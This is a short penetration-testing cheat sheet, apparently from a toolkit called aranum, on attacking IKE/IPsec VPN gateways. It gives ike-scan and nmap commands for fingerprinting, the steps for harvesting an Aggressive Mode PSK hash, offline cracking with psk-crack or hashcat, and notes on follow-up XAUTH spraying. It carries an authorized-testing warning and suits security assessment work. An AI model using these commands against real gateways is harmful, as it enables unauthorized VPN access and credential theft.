---
service: ike
title: IKE / IPsec VPN
ports: 500, 4500
aliases: isakmp, ipsec, ike
---

# IKE / IPsec — quick wins

**When you see it:** UDP 500 (ISAKMP) or 4500 (NAT-T) responding to an IKE probe → a VPN
gateway. The prize is **Aggressive Mode with PSK**: the gateway hands you a hash of the
pre-shared key before authenticating, which cracks offline. This is an **opt-in / aggressive**
surface in aranum (`--ike`, PSK harvest doubly gated).

> Authorized testing only. Aggressive-mode PSK harvest sends real IKEv1 packets and can leak
> the gateway's PSK hash — it is doubly gated (`ENUM_IKE_AGGRESSIVE_MODE=1`) for a reason.
> Steps marked ✏️ actively negotiate with the gateway.

## Triage (read-only)
```sh
ike-scan -M H                          # main-mode handshake — confirms IKEv1 + vendor IDs
nmap -sU -p 500 --script ike-version H # version / vendor fingerprint via NSE
ike-scan --ikev2 -M H                  # is IKEv2 offered?
```

## Quick wins

### Vendor-ID fingerprint (main mode)
```sh
ike-scan -M --showbackoff H
```
*Why:* the vendor IDs and retransmission backoff pattern fingerprint the device (Cisco,
Fortinet, Checkpoint, strongSwan) → maps to appliance-specific CVEs and default configs.

### Aggressive-mode PSK hash harvest ✏️
```sh
ike-scan -A -M --pskcrack=psk.hash H          # request Aggressive Mode, save hash
# try a group/ID name if the gateway needs one:
ike-scan -A -M --id=vpn --pskcrack=psk.hash H
```
*Why:* Aggressive Mode sends the PSK hash in the response *before* authenticating — capture
it once and crack offline, no rate limit. The precondition is the gateway offering Aggressive
Mode with PSK auth.

### Crack the captured PSK ✏️ (offline)
```sh
psk-crack -d /usr/share/wordlists/rockyou.txt psk.hash
# or hashcat: hashcat -m 5300 psk.hash rockyou.txt
```
*Why:* a cracked group PSK gets you onto the VPN (often the last hurdle before an XAUTH
username/password spray) — hashcat mode `5300` is the IKE Aggressive-Mode PSK format.

## aranum helpers
- `aranumtoolkit/network/enum-ike.sh` — **opt-in** dispatcher (`--ike`/`--aggressive`); main-mode probe + vendor-ID; aggressive-mode PSK harvest doubly gated behind `ENUM_IKE_AGGRESSIVE_MODE=1`.

## Gotchas
- UDP scanning is unreliable — no response ≠ closed; `ike-scan` is more authoritative than a plain `nmap -sU`.
- Only IKEv1 Aggressive Mode leaks the PSK; IKEv2 and Main Mode do not — if only IKEv2 is offered, this path is dead.
- Some gateways require a valid group/ID name before responding in Aggressive Mode — enumerate common ones (`vpn`, `group`, company name).
- A cracked PSK usually still needs XAUTH creds for full access — treat it as one factor, not full compromise.

## Sources
- `ike-scan`/`psk-crack` documentation (NTA Monitor); HackTricks `ipsec-ike-vpn-pentesting`; hashcat mode 5300 notes.
